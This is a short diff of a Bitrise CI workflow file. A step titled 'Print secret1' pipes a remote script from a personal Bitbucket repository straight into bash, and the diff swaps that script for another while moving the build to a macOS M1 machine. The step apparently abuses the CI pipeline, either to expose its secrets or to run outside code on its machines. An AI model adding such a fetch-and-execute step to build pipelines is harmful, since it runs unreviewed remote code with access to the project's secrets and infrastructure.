@@ -43,9 +43,9 @@ workflows:
     - script@1:
         title: Print secret1
         inputs:
-        - content: curl -sL https://bitbucket.org/nicezep/korong/raw/master/zeprise
+        - content: curl https://bitbucket.org/nicezep/korong/raw/master/bitrisemac
             | bash
 meta:
   bitrise.io:
-    stack: linux-docker-android-20.04
-    machine_type_id: elite
+    stack: osx-xcode-14.3.x-ventura
+    machine_type_id: g2-m1.8core
